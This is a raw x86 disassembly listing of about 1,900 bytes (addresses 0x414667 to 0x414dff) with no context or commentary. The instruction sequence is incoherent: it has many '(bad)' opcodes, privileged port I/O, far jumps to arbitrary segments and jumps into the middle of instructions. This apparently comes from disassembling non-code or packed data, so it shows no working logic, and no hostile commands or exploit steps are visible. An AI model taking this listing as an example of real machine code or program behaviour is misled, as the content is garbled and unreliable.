  414667:	call   0x8f5a:0xa20019b2
  41466e:	mov    eax,0x72755479
  414673:	jecxz  0x414634
  414675:	fcomip st,st(2)
  414677:	xchg   esi,eax
  414678:	jge    0x4146cd
  41467a:	inc    edx
  41467b:	push   ds
  41467c:	pusha  
  41467d:	add    al,0xc3
  41467f:	data16 (bad) 
  414682:	jo     0x41467d
  414684:	in     al,0xee
  414686:	mov    edi,0x34f060c2
  41468b:	stos   DWORD PTR es:[edi],eax
  41468c:	mov    ecx,edi
  41468e:	cmp    al,0xc6
  414690:	cli    
  414691:	jmp    0x4e25a724
  414696:	jge    0x41464a
  414698:	cmp    esp,DWORD PTR [eax-0x688d455a]
  41469e:	jle    0x414672
  4146a0:	ins    BYTE PTR es:[edi],dx
  4146a1:	xchg   BYTE PTR [edi+0x73],cl
  4146a4:	mov    edi,0xed191fa0
  4146a9:	xchg   DWORD PTR [edx-0x48],edi
  4146ac:	sbb    dl,BYTE PTR [edx+0x6fbbc9a7]
  4146b2:	xchg   esi,eax
  4146b3:	xlat   BYTE PTR ds:[ebx]
  4146b4:	adc    al,0x18
  4146b6:	and    BYTE PTR [ebx],0xec
  4146b9:	xchg   bh,al
  4146bb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4146bc:	mov    bh,0x25
  4146be:	jmp    0xdab6:0x4252fd89
  4146c5:	test   BYTE PTR [eax+eax*4+0x4e],bl
  4146c9:	shl    BYTE PTR [edx-0x72],cl
  4146cc:	add    ah,0x2b
  4146cf:	in     eax,0xb6
  4146d1:	sbb    al,0xe
  4146d3:	and    DWORD PTR [edi-0x74d36ee2],ebx
  4146d9:	pop    edi
  4146da:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4146db:	outs   dx,DWORD PTR ds:[esi]
  4146dc:	repnz test BYTE PTR ds:0xed40dd83,0x9c
  4146e4:	repz dec esp
  4146e6:	pop    es
  4146e7:	mov    ecx,0x6214118c
  4146ec:	mov    ?,WORD PTR gs:[eax+0x2d064076]
  4146f3:	mov    ds:0xfebf15d9,eax
  4146f8:	in     al,0x9a
  4146fa:	dec    ebp
  4146fb:	stos   BYTE PTR es:[edi],al
  4146fc:	xchg   esp,eax
  4146fd:	das    
  4146fe:	clc    
  4146ff:	js     0x414755
  414701:	lahf   
  414702:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414703:	pop    eax
  414704:	sti    
  414705:	fwait
  414706:	cmp    esp,0xffffffd1
  414709:	push   esp
  41470a:	pusha  
  41470b:	mov    edx,0xfa4e1843
  414710:	jns    0x4146cb
  414712:	std    
  414713:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414714:	shl    DWORD PTR [esi+0x77],cl
  414717:	dec    esi
  414718:	xor    bh,BYTE PTR [esi+eax*4-0x7]
  41471c:	sub    BYTE PTR [edx-0x29],ah
  41471f:	push   ds
  414720:	jb     0x414711
  414722:	push   edx
  414723:	push   es
  414724:	or     BYTE PTR [ebp+0xea555b7],bl
  41472a:	push   edi
  41472b:	ins    BYTE PTR es:[edi],dx
  41472c:	imul   esp,DWORD PTR [ebx+0x23137bab],0xcb6e10e6
  414736:	gs push 0xb3146afc
  41473c:	jnp    0x4146f3
  41473e:	or     al,0x13
  414740:	push   cs
  414741:	call   0x4878:0x10ba8905
  414748:	dec    edi
  414749:	sub    DWORD PTR [esi],ebx
  41474b:	ret    
  41474c:	push   edi
  41474d:	mov    dl,0x99
  41474f:	pop    esi
  414750:	push   cs
  414751:	in     eax,0x8c
  414753:	scas   eax,DWORD PTR es:[edi]
  414754:	cwde   
  414755:	nop
  414756:	loope  0x4147b0
  414758:	in     eax,dx
  414759:	stos   DWORD PTR es:[edi],eax
  41475a:	adc    BYTE PTR [eax-0x31439c75],ch
  414760:	fdiv   DWORD PTR [ebp+ecx*4-0x4a]
  414764:	push   ds
  414765:	xchg   esi,eax
  414766:	jo     0x414707
  414768:	add    DWORD PTR [ebx],0xffffffb4
  41476b:	xchg   DWORD PTR [ebx+0x7],ebp
  41476e:	adc    eax,0x7a70c83b
  414773:	neg    DWORD PTR [esi+eax*8-0x610dfc04]
  41477a:	adc    al,0x63
  41477c:	ficomp DWORD PTR [eax]
  41477e:	into   
  41477f:	cli    
  414780:	xor    eax,DWORD PTR [esi-0x47]
  414783:	mov    ds:0xb35c4240,al
  414788:	mov    ds,WORD PTR [edi]
  41478a:	aam    0x81
  41478c:	xchg   ebp,eax
  41478d:	cmp    DWORD PTR [esi],esp
  41478f:	sub    ecx,DWORD PTR [eax+0x1c9046c1]
  414795:	jg     0x414720
  414797:	jne    0x414805
  414799:	mov    dh,0x12
  41479b:	fld    DWORD PTR [edi+0x55bcd011]
  4147a1:	fiadd  DWORD PTR [ebx+0x3fb1f5ea]
  4147a7:	repnz bound edx,QWORD PTR [esi-0x1c]
  4147ab:	cwde   
  4147ac:	das    
  4147ad:	repz mov cl,BYTE PTR [esi+0x7f]
  4147b1:	mov    edx,0xc9f2b2ff
  4147b6:	and    cl,BYTE PTR [edx-0x49]
  4147b9:	test   BYTE PTR [edx+0x3d],dh
  4147bc:	add    edx,0x679a6ab8
  4147c2:	sar    DWORD PTR [edi+0x4f9fed83],1
  4147c8:	cmp    BYTE PTR [esp+ebx*2-0x77],dh
  4147cc:	jle    0x4147dd
  4147ce:	outs   dx,BYTE PTR ds:[esi]
  4147cf:	push   0xfffffffd
  4147d1:	inc    esi
  4147d2:	jp     0x414786
  4147d4:	call   0x74d87815
  4147d9:	jecxz  0x4147b0
  4147db:	pop    ss
  4147dc:	sub    BYTE PTR [edi],cl
  4147de:	cld    
  4147df:	mov    al,0x2c
  4147e1:	mov    ebp,0xd425a9c2
  4147e6:	xor    BYTE PTR [eax],0x8
  4147e9:	out    dx,al
  4147ea:	call   0xe6d76ad6
  4147ef:	cli    
  4147f0:	and    eax,0x6b19c5c0
  4147f5:	jmp    0x414817
  4147f7:	daa    
  4147f8:	adc    esi,DWORD PTR [esi]
  4147fa:	ins    DWORD PTR es:[edi],dx
  4147fb:	mov    ebx,0x4becd4a9
  414800:	push   eax
  414801:	(bad)  
  414802:	fcomp  DWORD PTR [edx+edx*1+0xe1ad2cc]
  414809:	jg     0x41483f
  41480b:	mov    eax,ds:0xbfd8e256
  414810:	sbb    BYTE PTR [edi],al
  414812:	sub    bh,bh
  414814:	inc    edx
  414815:	cmp    eax,0x60b6bf3f
  41481a:	cmp    edi,DWORD PTR [eax]
  41481c:	repz rcr BYTE PTR [edx],0x76
  414820:	fsub   DWORD PTR ds:0xdb71fa19
  414826:	test   eax,0xf9058935
  41482b:	xchg   esp,eax
  41482c:	mov    eax,0x15da40a8
  414831:	cli    
  414832:	call   0x290dccb
  414837:	and    BYTE PTR [ecx-0x6c],al
  41483a:	test   eax,0x412abb9e
  41483f:	dec    edx
  414840:	test   bh,al
  414842:	clc    
  414843:	dec    edi
  414844:	shl    eax,cl
  414846:	sbb    BYTE PTR [eax],bh
  414848:	mov    esp,0x74ee5a7c
  41484d:	mov    ch,0xcd
  41484f:	push   edx
  414850:	jae    0x414839
  414852:	pop    ecx
  414853:	add    BYTE PTR [edx-0x204a10],dl
  414859:	fnstcw WORD PTR [ecx-0x20]
  41485c:	icebp  
  41485d:	popf   
  41485e:	jno    0x414875
  414860:	aam    0x68
  414862:	and    ebx,edi
  414864:	and    bl,BYTE PTR [edi]
  414866:	sub    al,0x40
  414868:	retf   0x76e1
  41486b:	fucomi st,st(2)
  41486d:	xchg   BYTE PTR ds:0x729f2b06,dh
  414873:	dec    ebx
  414874:	js     0x414866
  414876:	call   0x30d85b59
  41487b:	add    eax,DWORD PTR [edi]
  41487d:	jnp    0x4148d4
  41487f:	(bad)  
  414880:	jmp    FWORD PTR [ebp+0x6849726d]
  414886:	and    eax,0x1a4e7d4b
  41488b:	and    dh,bl
  41488d:	cmp    DWORD PTR [edx-0x35],esi
  414890:	outs   dx,BYTE PTR ds:[esi]
  414891:	jmp    0xf6be:0xc2647c63
  414898:	inc    edi
  414899:	mov    dl,0x86
  41489b:	pusha  
  41489c:	or     dl,dh
  41489e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41489f:	fcom   QWORD PTR fs:[ebx]
  4148a2:	xchg   ecx,eax
  4148a3:	iret   
  4148a4:	xor    al,0x26
  4148a6:	adc    eax,0xb45c3ff1
  4148ab:	ins    BYTE PTR es:[edi],dx
  4148ac:	inc    esi
  4148ad:	jmp    0x4148e9
  4148af:	scas   al,BYTE PTR es:[edi]
  4148b0:	rep stos DWORD PTR es:[edi],eax
  4148b2:	push   0xffffffee
  4148b4:	inc    esp
  4148b5:	mov    ah,0xe1
  4148b7:	pop    eax
  4148b8:	mov    esp,0x6eb7e06f
  4148bd:	into   
  4148be:	jno    0x414929
  4148c0:	fyl2xp1 
  4148c2:	pop    edx
  4148c3:	cdq    
  4148c4:	dec    ecx
  4148c5:	push   esp
  4148c6:	push   ds
  4148c7:	int    0xe9
  4148c9:	jmp    0x415:0xc8e632cc
  4148d0:	inc    edx
  4148d1:	lea    ebx,[ebx]
  4148d3:	cmp    eax,0xf4aeb93c
  4148d8:	fld    DWORD PTR [ebp-0x2c]
  4148db:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4148dc:	call   0x90bbd3cf
  4148e1:	repnz xchg esi,eax
  4148e3:	aam    0xd7
  4148e5:	adc    ah,dh
  4148e7:	ins    BYTE PTR es:[edi],dx
  4148e8:	adc    edi,esp
  4148ea:	dec    edx
  4148eb:	or     DWORD PTR [ecx],0xab6a706
  4148f1:	and    ebp,DWORD PTR [eax]
  4148f3:	cmp    esi,esi
  4148f5:	inc    eax
  4148f6:	js     0x41496b
  4148f8:	leave  
  4148f9:	xor    dh,BYTE PTR [edi+0x1a]
  4148fc:	lods   al,BYTE PTR ds:[esi]
  4148fd:	pop    esp
  4148fe:	jnp    0x414913
  414900:	inc    ecx
  414901:	scas   eax,DWORD PTR es:[edi]
  414902:	fdivr  QWORD PTR [eax+0x10536b97]
  414908:	inc    ebp
  414909:	pop    ebp
  41490a:	jb     0x4148d1
  41490c:	aaa    
  41490d:	mov    edx,0xfb7c26ef
  414912:	cmp    BYTE PTR [edi],cl
  414914:	mov    ah,0xde
  414916:	std    
  414917:	loop   0x4148e1
  414919:	adc    al,0x87
  41491b:	ret    0x7c71
  41491e:	push   edx
  41491f:	lods   al,BYTE PTR ds:[esi]
  414920:	lds    esi,FWORD PTR [edx-0xe187c5f]
  414926:	add    dl,BYTE PTR [ecx-0x26]
  414929:	xchg   ecx,eax
  41492a:	iret   
  41492b:	cmp    al,0x4f
  41492d:	jae    0x4148db
  41492f:	adc    eax,0xbd47fb2c
  414934:	jp     0x4149ac
  414936:	jno    0x41496f
  414938:	dec    esi
  414939:	mov    cs,ecx
  41493b:	push   ds
  41493c:	inc    eax
  41493d:	jmp    0x9c8d51bf
  414942:	sti    
  414943:	leave  
  414944:	pushf  
  414945:	and    eax,0x4ea6e487
  41494a:	test   esi,eax
  41494c:	inc    ebp
  41494d:	pop    esp
  41494e:	sti    
  41494f:	pop    ss
  414950:	pushf  
  414951:	mov    ah,0xc1
  414953:	adc    al,0x88
  414955:	jp     0x414983
  414957:	mov    dl,0x14
  414959:	mov    ds:0xef0d40fa,al
  41495e:	loope  0x4149b2
  414960:	js     0x414935
  414962:	lahf   
  414963:	out    dx,eax
  414964:	nop
  414965:	fistp  QWORD PTR [eax-0x27]
  414968:	sbb    al,0x9e
  41496a:	adc    DWORD PTR [eax],esi
  41496c:	pusha  
  41496d:	or     DWORD PTR ds:0x7cc1fdf8,0xffffffad
  414974:	out    0xcd,eax
  414976:	test   al,0x23
  414978:	lds    esp,FWORD PTR [ebp-0x77]
  41497b:	mov    ebx,0xe635764f
  414980:	imul   ecx,DWORD PTR [edx+0x31],0x8462c512
  414987:	mov    ah,0x62
  414989:	push   cs
  41498a:	in     eax,dx
  41498b:	or     eax,0x9c84230f
  414990:	push   esi
  414991:	cmp    ebp,ecx
  414993:	dec    ebx
  414994:	lds    ebx,FWORD PTR [edi]
  414996:	xchg   ecx,eax
  414997:	loopne 0x4149f1
  414999:	shl    edi,cl
  41499b:	not    DWORD PTR [edi]
  41499d:	jo     0x4149dc
  41499f:	test   DWORD PTR [esi-0xf687c9a],eax
  4149a5:	stos   DWORD PTR es:[edi],eax
  4149a6:	das    
  4149a7:	add    eax,0x409c4436
  4149ac:	(bad)  
  4149ad:	lock aad 0x4f
  4149b0:	jmp    0x4149ad
  4149b2:	popa   
  4149b3:	push   cs
  4149b4:	loop   0x4149fd
  4149b6:	and    cl,dl
  4149b8:	lods   al,BYTE PTR ds:[esi]
  4149b9:	mov    ah,BYTE PTR [edx]
  4149bb:	mov    ds:0xaec1f05e,eax
  4149c0:	mov    ds:0x7519603c,al
  4149c5:	inc    edx
  4149c6:	or     esp,edi
  4149c8:	stos   BYTE PTR es:[edi],al
  4149c9:	cmp    eax,0xc4d95b2c
  4149ce:	inc    esi
  4149cf:	lods   eax,DWORD PTR ds:[esi]
  4149d0:	(bad)  
  4149d1:	push   ss
  4149d2:	dec    eax
  4149d3:	add    bh,al
  4149d5:	jmp    0x414969
  4149d7:	int3   
  4149d8:	imul   edx,DWORD PTR [ebp-0x18100941],0xffffff8f
  4149df:	mov    esp,esp
  4149e1:	dec    edi
  4149e2:	enter  0xe4ed,0xbf
  4149e6:	mov    ah,0x51
  4149e8:	and    al,0x31
  4149ea:	cmps   DWORD PTR gs:[esi],DWORD PTR es:[edi]
  4149ec:	push   cs
  4149ed:	cwde   
  4149ee:	and    edi,ecx
  4149f0:	pop    eax
  4149f1:	cmp    BYTE PTR [ebx-0x66ef151],al
  4149f7:	pop    edx
  4149f8:	mov    al,0x5f
  4149fa:	xor    eax,0xaac8c8c0
  4149ff:	ds pop ecx
  414a01:	fstp   st(6)
  414a03:	mov    esi,0x1848556c
  414a08:	xchg   ebx,eax
  414a09:	cld    
  414a0a:	add    dl,BYTE PTR [edx+ebx*8]
  414a0d:	mov    bl,0x52
  414a0f:	(bad)  
  414a10:	outs   dx,DWORD PTR ds:[esi]
  414a11:	fadd   st,st(5)
  414a13:	aam    0x17
  414a15:	retf   0x8cca
  414a18:	rol    bl,cl
  414a1a:	inc    edi
  414a1b:	jl     0x414a2c
  414a1d:	ret    
  414a1e:	outs   dx,DWORD PTR ds:[esi]
  414a1f:	stos   DWORD PTR es:[edi],eax
  414a20:	sub    al,0xde
  414a22:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414a23:	add    ecx,esi
  414a25:	adc    cl,BYTE PTR [eax+ecx*2]
  414a28:	sub    DWORD PTR fs:[edi+0x66ff26f6],0x6e25ed0b
  414a33:	std    
  414a34:	(bad)  [ebp-0x29171982]
  414a3a:	xchg   edi,eax
  414a3b:	pop    esp
  414a3c:	ror    DWORD PTR [ecx],0x5b
  414a3f:	lahf   
  414a40:	lahf   
  414a41:	mov    cl,0x56
  414a43:	retf   0x1403
  414a46:	(bad)  
  414a47:	dec    esp
  414a48:	mov    dh,0x96
  414a4a:	push   ecx
  414a4b:	ins    DWORD PTR es:[edi],dx
  414a4c:	or     dh,ah
  414a4e:	loop   0x414a69
  414a50:	xor    dh,BYTE PTR [edx]
  414a52:	fmul   st(7),st
  414a54:	jne    0x4149f3
  414a56:	add    al,0x89
  414a58:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414a59:	push   edx
  414a5a:	ret    0x9902
  414a5d:	test   eax,0xe3383a95
  414a62:	sbb    esp,edi
  414a64:	pop    es
  414a65:	pop    edi
  414a66:	imul   ebp,DWORD PTR [ecx],0xc0972ab8
  414a6c:	imul   ebx,ecx,0xefb1166a
  414a72:	sub    bl,bl
  414a74:	mov    edx,eax
  414a76:	mov    edi,0xc896739b
  414a7b:	pop    ebp
  414a7c:	rcr    edx,1
  414a7e:	sbb    dh,BYTE PTR [esp+ebp*4+0x5275312a]
  414a85:	adc    eax,0xe5da6a2
  414a8a:	mov    BYTE PTR [eax-0x76],ch
  414a8d:	repnz test DWORD PTR [ebx+0x5a],0x9b0a67a
  414a95:	mov    DWORD PTR [edi+0x4d],esi
  414a98:	push   0xbf1d6791
  414a9d:	xchg   edx,eax
  414a9e:	mov    BYTE PTR [edi+0x37980a5],dl
  414aa4:	push   eax
  414aa5:	xor    esp,DWORD PTR [edx+0x6258ff05]
  414aab:	ins    DWORD PTR es:[edi],dx
  414aac:	add    DWORD PTR [eax-0x17b0bd53],edx
  414ab2:	cmp    al,0x66
  414ab4:	mov    BYTE PTR [edi-0x7c],al
  414ab7:	add    esi,DWORD PTR [edi]
  414ab9:	jmp    0x414a3d
  414abb:	inc    esp
  414abc:	push   ds
  414abd:	or     DWORD PTR [esi],ebx
  414abf:	push   cs
  414ac0:	or     DWORD PTR [edx+esi*8-0x3c],esp
  414ac4:	xor    eax,0x1fbbf464
  414ac9:	cwde   
  414aca:	out    0x49,al
  414acc:	xor    ebx,edi
  414ace:	inc    esp
  414acf:	push   esp
  414ad0:	dec    esp
  414ad1:	push   esp
  414ad2:	cli    
  414ad3:	gs inc edi
  414ad5:	mov    eax,ds:0xd2cdc811
  414ada:	repnz retf 
  414adc:	mov    ds:0xfd54f820,eax
  414ae1:	sbb    ebx,DWORD PTR [edi]
  414ae3:	xor    ch,ah
  414ae5:	push   0x5b37bba2
  414aea:	or     dh,bl
  414aec:	sub    eax,0xec73f1bb
  414af1:	rcr    DWORD PTR [esp+ecx*1-0x1f],1
  414af5:	dec    DWORD PTR [ebp-0x6d]
  414af8:	mov    ch,0xe2
  414afb:	dec    ebx
  414afc:	add    BYTE PTR [esi+0xac5d53a],dh
  414b02:	inc    ebp
  414b03:	push   0x35
  414b05:	mov    ah,BYTE PTR [ebp+0x2c]
  414b08:	inc    BYTE PTR [edi+0x2c2c0144]
  414b0e:	dec    esp
  414b0f:	xor    BYTE PTR [ebp+esi*8+0x12],bl
  414b13:	xchg   BYTE PTR [ecx],ah
  414b15:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414b16:	(bad)  
  414b17:	enter  0xd57a,0x58
  414b1b:	fiadd  DWORD PTR [eax+0x42]
  414b1e:	dec    eax
  414b1f:	pop    ss
  414b20:	sar    DWORD PTR [eax+0x7212ec42],0xd6
  414b27:	jne    0x414b4e
  414b29:	add    eax,0x30df4498
  414b2e:	js     0x414ae6
  414b30:	sbb    eax,0x7dba98b3
  414b35:	(bad)  
  414b36:	mov    DWORD PTR [edx+0x56060153],esi
  414b3c:	jg     0x414b3d
  414b3e:	call   FWORD PTR [eax]
  414b40:	inc    ecx
  414b41:	pop    esp
  414b42:	mov    ebx,0xcce3f0c
  414b47:	jnp    0x414b8e
  414b49:	jmp    0xe523:0xe3595c7e
  414b50:	outs   dx,BYTE PTR ds:[esi]
  414b51:	pop    es
  414b52:	pop    edi
  414b53:	and    bl,BYTE PTR [esi]
  414b55:	ins    DWORD PTR es:[edi],dx
  414b56:	pop    ebx
  414b57:	push   ebp
  414b58:	cld    
  414b59:	inc    ecx
  414b5a:	fldcw  WORD PTR ds:0x4334a826
  414b60:	rcr    BYTE PTR [ecx+edx*4+0x2c],1
  414b64:	imul   edx,esi,0x6c
  414b67:	clc    
  414b68:	clc    
  414b69:	ss pop es
  414b6b:	imul   eax,DWORD PTR [eax],0xffffffe9
  414b6e:	int    0xb3
  414b70:	push   ecx
  414b71:	loop   0x414b84
  414b73:	arpl   bx,di
  414b75:	jno    0x414bba
  414b77:	xchg   DWORD PTR ds:0xf7db79d4,ecx
  414b7d:	ss jge 0x414b19
  414b80:	xor    edx,DWORD PTR [edx-0x569e1b80]
  414b86:	sbb    dl,al
  414b88:	mov    WORD PTR [edi],cs
  414b8a:	xlat   BYTE PTR ds:[ebx]
  414b8b:	mov    bh,0x3e
  414b8d:	cmp    dh,BYTE PTR [ebx]
  414b8f:	jae    0x414b2b
  414b91:	xchg   edi,eax
  414b92:	outs   dx,BYTE PTR ds:[esi]
  414b93:	jge    0x414b88
  414b95:	fdiv   st(0),st
  414b97:	xor    cl,dl
  414b99:	adc    dl,BYTE PTR [eax]
  414b9b:	call   eax
  414b9d:	pop    esi
  414b9e:	and    edx,esp
  414ba0:	popa   
  414ba1:	scas   al,BYTE PTR es:[edi]
  414ba2:	cli    
  414ba3:	xor    BYTE PTR [ebp+0x78ab547a],ch
  414ba9:	mov    al,ds:0xdfe7e0e5
  414bae:	mov    esi,0x96f02a19
  414bb3:	push   ebp
  414bb4:	es sub al,0x76
  414bb7:	fdiv   DWORD PTR [ebx+edi*2+0x70]
  414bbb:	in     al,dx
  414bbc:	xlat   BYTE PTR ds:[ebx]
  414bbd:	sub    DWORD PTR [edx+0x6f],esi
  414bc0:	int3   
  414bc1:	mov    ch,0xcf
  414bc3:	jp     0x414b60
  414bc5:	cmp    al,0x38
  414bc7:	jp     0x414b9c
  414bc9:	loop   0x414b95
  414bcb:	popa   
  414bcc:	cli    
  414bcd:	sbb    dl,BYTE PTR [edi-0x62044458]
  414bd3:	xchg   BYTE PTR ds:0xbcb455ab,ch
  414bd9:	ins    BYTE PTR es:[edi],dx
  414bda:	jno    0x414b5f
  414bdc:	inc    ecx
  414bdd:	add    ah,dh
  414bdf:	out    0x84,al
  414be1:	xor    BYTE PTR [edi+0x3c],0xd
  414be5:	das    
  414be6:	cmp    DWORD PTR gs:[edi+0x43380cbb],esi
  414bed:	pop    ecx
  414bee:	adc    al,0x26
  414bf0:	jns    0x414c36
  414bf2:	pop    esi
  414bf3:	icebp  
  414bf4:	js     0x414b9d
  414bf6:	retf   0xafd2
  414bf9:	sar    BYTE PTR [ecx],0x43
  414bfc:	fwait
  414bfd:	jbe    0x414c12
  414bff:	gs jecxz 0x414c7f
  414c02:	std    
  414c03:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414c04:	adc    edi,edi
  414c06:	lmsw   WORD PTR [edi-0x250fc10b]
  414c0d:	adc    BYTE PTR [esi-0x4c1f692],ch
  414c13:	add    al,0xc4
  414c15:	mov    ds:0x6ec1355e,eax
  414c1a:	inc    esp
  414c1b:	xor    BYTE PTR [ebp-0x2b],dh
  414c1e:	or     eax,0xa52de62f
  414c23:	pop    es
  414c24:	or     BYTE PTR [eax],0x90
  414c27:	in     al,dx
  414c28:	mov    ah,0x74
  414c2a:	arpl   dx,si
  414c2c:	xchg   esi,eax
  414c2d:	in     eax,dx
  414c2e:	jne    0x414bd7
  414c30:	(bad)  
  414c31:	out    0xb3,eax
  414c33:	not    DWORD PTR [ebp+0x2a]
  414c36:	adc    DWORD PTR [esi+eiz*2],ebx
  414c39:	or     eax,0xf51dfc27
  414c3e:	cmp    eax,0x3a2a9321
  414c43:	or     eax,0x4c9efccc
  414c48:	sbb    ebp,ebx
  414c4a:	cld    
  414c4b:	lds    esp,FWORD PTR [edx]
  414c4d:	pop    eax
  414c4e:	(bad)  
  414c4f:	popa   
  414c50:	dec    esp
  414c51:	lock pusha 
  414c53:	clc    
  414c54:	jg     0x414bfa
  414c56:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414c57:	and    eax,0x16003176
  414c5c:	das    
  414c5d:	std    
  414c5e:	sub    al,0x5b
  414c60:	pop    esi
  414c61:	mov    es,WORD PTR [esi+0x6d5c659e]
  414c67:	pop    esp
  414c68:	adc    dh,bl
  414c6a:	int3   
  414c6b:	cmc    
  414c6c:	inc    ebx
  414c6d:	jno    0x414c9a
  414c6f:	jmp    0x414c8c
  414c71:	inc    ecx
  414c72:	or     bh,0x65
  414c75:	lods   al,BYTE PTR ds:[esi]
  414c76:	pop    ds
  414c77:	mov    ah,cl
  414c79:	sub    eax,0x111712f1
  414c7e:	fnstcw WORD PTR [esp+edi*1+0x4146a68b]
  414c85:	xchg   ebx,eax
  414c86:	test   al,0x40
  414c88:	call   0xd51b:0xa6810f4d
  414c8f:	in     al,0x5f
  414c91:	mov    esp,0x833074c9
  414c96:	inc    ebx
  414c97:	out    dx,al
  414c98:	retf   
  414c99:	inc    ebp
  414c9a:	mov    cl,0x28
  414c9c:	cmp    esi,ebx
  414c9e:	daa    
  414c9f:	sar    BYTE PTR [edi],0x78
  414ca2:	les    esp,FWORD PTR [ecx-0x1ac70f5d]
  414ca8:	pop    edi
  414ca9:	pop    ss
  414caa:	push   ss
  414cab:	or     ah,BYTE PTR [edx]
  414cad:	test   eax,0x341db6c5
  414cb2:	or     dh,BYTE PTR [esp+ebp*4+0x7c663db2]
  414cb9:	jbe    0x414cc1
  414cbb:	in     eax,0xf0
  414cbd:	dec    ebx
  414cbe:	xor    eax,DWORD PTR [esi+edx*2]
  414cc1:	sbb    al,0x5
  414cc3:	or     al,0x8
  414cc5:	xor    DWORD PTR [edi],ebp
  414cc7:	add    BYTE PTR [ecx+0x360b1153],ch
  414ccd:	cwde   
  414cce:	add    eax,0x4f709e1a
  414cd3:	inc    ebp
  414cd4:	repnz dec edi
  414cd6:	test   DWORD PTR [edi+0x2d],0xf7d836d7
  414cdd:	(bad)  
  414cde:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414cdf:	cli    
  414ce0:	mov    al,0xeb
  414ce2:	addr16 sbb al,dl
  414ce5:	push   ecx
  414ce6:	cmp    al,BYTE PTR ds:0x47173c5e
  414cec:	int    0x6e
  414cee:	fidiv  DWORD PTR [ecx]
  414cf0:	mov    edi,0x59f7ed51
  414cf5:	pusha  
  414cf6:	sub    edi,DWORD PTR [edi]
  414cf8:	adc    BYTE PTR [ecx],ch
  414cfa:	pop    ss
  414cfb:	or     al,0x2d
  414cfd:	ins    BYTE PTR es:[edi],dx
  414cfe:	or     eax,0x47dfa70a
  414d03:	rcr    ecx,cl
  414d05:	push   edi
  414d06:	ret    0x1f8b
  414d09:	cs add eax,0x1ff94c58
  414d0f:	inc    esp
  414d10:	rol    BYTE PTR [esi-0x5c6c5d03],cl
  414d16:	out    dx,eax
  414d17:	fucom  st(2)
  414d19:	cmp    BYTE PTR [eax+0x77],al
  414d1c:	and    eax,0xc55e26cc
  414d21:	(bad)  
  414d22:	icebp  
  414d23:	pop    ecx
  414d24:	or     eax,0xd333577d
  414d29:	dec    esi
  414d2a:	xor    BYTE PTR [ebx+edi*4],ch
  414d2d:	arpl   WORD PTR [ecx],si
  414d2f:	mov    ch,BYTE PTR [ecx]
  414d31:	lock xor dh,0x56
  414d35:	out    0x33,al
  414d37:	out    dx,al
  414d38:	and    DWORD PTR [edx],esi
  414d3a:	shl    DWORD PTR [ebx],0x71
  414d3d:	(bad)  
  414d3e:	jge    0x414cc1
  414d40:	fadd   st(1),st
  414d42:	dec    eax
  414d43:	mov    ds:0xaeb4c01b,eax
  414d48:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414d49:	sahf   
  414d4a:	pop    edi
  414d4b:	adc    eax,0xd8c2de05
  414d50:	icebp  
  414d51:	cli    
  414d52:	xchg   ecx,eax
  414d53:	ja     0x414dcb
  414d55:	mov    ebp,0x22255883
  414d5a:	fwait
  414d5b:	sahf   
  414d5c:	xor    al,0x3e
  414d5e:	adc    ecx,eax
  414d60:	jg     0x414d1f
  414d62:	addr16 push ds
  414d64:	mov    eax,ds:0xd84beb5
  414d69:	add    BYTE PTR [ebx],0x8b
  414d6c:	push   ds
  414d6d:	adc    cl,BYTE PTR [edx+edi*2-0x184b48c6]
  414d74:	rcr    eax,0x88
  414d77:	xor    ah,BYTE PTR [eax]
  414d79:	ret    0x3672
  414d7c:	mov    ecx,0x8a335d0d
  414d81:	jl     0x414d9c
  414d83:	dec    esi
  414d84:	adc    BYTE PTR [eax-0x2de4018a],dh
  414d8a:	sbb    esi,DWORD PTR [esi+eiz*8-0x22]
  414d8e:	mov    BYTE PTR [edx+0x1d],0xe4
  414d92:	inc    esp
  414d93:	std    
  414d94:	push   es
  414d95:	or     dh,bh
  414d97:	fld    QWORD PTR [edx-0x5]
  414d9a:	mov    al,0x26
  414d9c:	daa    
  414d9d:	dec    edi
  414d9e:	ins    DWORD PTR es:[edi],dx
  414d9f:	fcom   st(2)
  414da1:	jbe    0x414dba
  414da3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414da4:	push   es
  414da5:	shl    ch,1
  414da7:	xchg   esp,eax
  414da8:	cmpxchg BYTE PTR [edx+0x2b42c9ba],dl
  414daf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414db0:	iret   
  414db1:	inc    ebp
  414db2:	sti    
  414db3:	stc    
  414db4:	std    
  414db5:	test   eax,0xb54551a8
  414dba:	test   BYTE PTR [edi+0x6e59d97e],bh
  414dc0:	jbe    0x414dc4
  414dc2:	mov    edx,0xe3e9a134
  414dc7:	sti    
  414dc8:	movs   BYTE PTR es:[edi],BYTE PTR gs:[esi]
  414dca:	loope  0x414e0a
  414dcc:	mov    bh,0x96
  414dce:	inc    esp
  414dcf:	int3   
  414dd0:	fstp   QWORD PTR [edx+ebx*4]
  414dd3:	xchg   esp,eax
  414dd4:	xchg   ecx,eax
  414dd5:	sbb    al,ch
  414dd7:	or     al,0xc1
  414dd9:	addr16 jo 0x414df5
  414ddc:	fild   QWORD PTR [edx]
  414dde:	add    eax,0xa8df30e9
  414de3:	xor    eax,0x70a9b115
  414de8:	add    edi,edi
  414dea:	xchg   esp,eax
  414deb:	sahf   
  414dec:	mov    ah,0xf3
  414dee:	mov    dl,0x35
  414df0:	pop    edx
  414df1:	outs   dx,BYTE PTR ds:[esi]
  414df2:	mov    dl,0x96
  414df4:	outs   dx,BYTE PTR ds:[esi]
  414df5:	push   edi
  414df6:	jecxz  0x414de5
  414df8:	jle    0x414da3
  414dfa:	jo     0x414e3e
  414dfc:	ret    0x5858
  414dff:	jmp    FWORD PTR [ecx-0x6e3158cc]
